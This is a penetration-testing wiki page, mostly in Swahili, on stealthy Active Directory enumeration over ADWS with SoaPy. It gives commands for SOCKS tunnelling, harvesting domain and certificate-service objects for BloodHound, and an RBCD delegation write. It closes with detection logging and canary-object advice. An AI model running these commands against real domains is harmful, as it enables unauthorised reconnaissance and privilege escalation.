# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) **imewezeshwa kwa default kwenye kila Domain Controller tangu Windows Server 2008 R2** na inasikiliza kwenye TCP **9389**.  Licha ya jina, **hakuna HTTP inayohusika**.  Badala yake, huduma hii inaonyesha data ya mtindo wa LDAP kupitia seti ya protokali za umiliki za .NET:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Kwa sababu trafiki imefungwa ndani ya hizi binary SOAP frames na inasafiri kupitia bandari isiyo ya kawaida, **kuhesabu kupitia ADWS kuna uwezekano mdogo wa kukaguliwa, kuchujwa au kusainiwa kuliko trafiki ya kawaida ya LDAP/389 & 636**.  Kwa waendeshaji hii inamaanisha:

* Utafiti wa siri – Timu za buluu mara nyingi hujikita kwenye maswali ya LDAP.
* Uhuru wa kukusanya kutoka **kwa mwenyeji asiye wa Windows (Linux, macOS)** kwa kutoboa 9389/TCP kupitia SOCKS proxy.
* Data sawa ambayo ungeweza kupata kupitia LDAP (watumiaji, vikundi, ACLs, muundo, nk.) na uwezo wa kufanya **kuandika** (mfano `msDs-AllowedToActOnBehalfOfOtherIdentity` kwa **RBCD**).

> NOTE: ADWS pia inatumika na zana nyingi za RSAT GUI/PowerShell, hivyo trafiki inaweza kuchanganyika na shughuli halali za admin.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) ni **utekelezaji kamili wa protokali ya ADWS katika Python safi**.  Inaunda NBFX/NBFSE/NNS/NMF frames byte kwa byte, ikiruhusu ukusanyaji kutoka kwa mifumo kama Unix bila kugusa .NET runtime.

### Key Features

* Inasaidia **proxying kupitia SOCKS** (inayofaa kutoka kwa C2 implants).
* Filters za utafutaji zenye undani sawa na LDAP `-q '(objectClass=user)'`.
* Operesheni za hiari za **kuandika** ( `--set` / `--delete` ).
* **BOFHound output mode** kwa ajili ya uingizaji wa moja kwa moja katika BloodHound.
* `--parse` flag ili kuboresha alama za muda / `userAccountControl` wakati usomaji wa kibinadamu unahitajika.

### Installation (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Stealth AD Collection Workflow

The following workflow shows how to enumerate **domain & ADCS objects** over ADWS, convert them to BloodHound JSON and hunt for certificate-based attack paths – all from Linux:

1. **Tunnel 9389/TCP** kutoka kwenye mtandao wa lengo hadi kwenye sanduku lako (kwa mfano kupitia Chisel, Meterpreter, SSH dynamic port-forward, n.k.). Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` au tumia SoaPy’s `--proxyHost/--proxyPort`.

2. **Kusanya kitu cha msingi cha domain:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Kusanya vitu vinavyohusiana na ADCS kutoka kwa Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Badilisha kuwa BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Pakia ZIP** kwenye GUI ya BloodHound na uendeshe maswali ya cypher kama `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` ili kufichua njia za kupandisha cheo za cheti (ESC1, ESC8, n.k.).

### Kuandika `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Patanisha hii na `s4u2proxy`/`Rubeus /getticket` kwa mnyororo kamili wa **Resource-Based Constrained Delegation**.

## Ugunduzi & Uimarishaji

### Kurekodi kwa Kina ADDS

wezesha funguo zifuatazo za rejista kwenye Watawala wa Kikoa ili kuonyesha utafutaji ghali / usio na ufanisi unaotoka kwenye ADWS (na LDAP):
```powershell
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics' -Name '15 Field Engineering' -Value 5 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Expensive Search Results Threshold' -Value 1 -Type DWORD
New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' -Name 'Search Time Threshold (msecs)' -Value 0 -Type DWORD
```
Mifano itatokea chini ya **Directory-Service** na kichujio kamili cha LDAP, hata wakati ombi lilifika kupitia ADWS.

### SACL Canary Objects

1. Unda kitu cha dummy (mfano, mtumiaji aliyezuiliwa `CanaryUser`).
2. Ongeza **Audit** ACE kwa _Everyone_ principal, iliyokaguliwa kwenye **ReadProperty**.
3. Wakati mshambuliaji anapofanya `(servicePrincipalName=*)`, `(objectClass=user)` nk, DC inatoa **Event 4662** ambayo ina SID halisi ya mtumiaji – hata wakati ombi linapokuwa na proxy au linatoka ADWS.

Mfano wa sheria iliyojengwa awali ya Elastic:
```kql
(event.code:4662 and not user.id:"S-1-5-18") and winlog.event_data.AccessMask:"0x10"
```
## Muhtasari wa Zana

| Kusudi | Zana | Maelezo |
|--------|------|---------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, kusoma/kandika |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Hubadilisha SoaPy/ldapsearch logs |
| Uthibitisho wa cheti | [Certipy](https://github.com/ly4k/Certipy) | Inaweza kupitishwa kupitia SOCKS sawa |

## Marejeleo

* [SpecterOps – Hakikisha Kutumia SOAP(y) – Mwongozo wa Wafanya Kazi kwa Kukusanya AD kwa Siri kwa Kutumia ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)

{{#include ../../banners/hacktricks-training.md}}
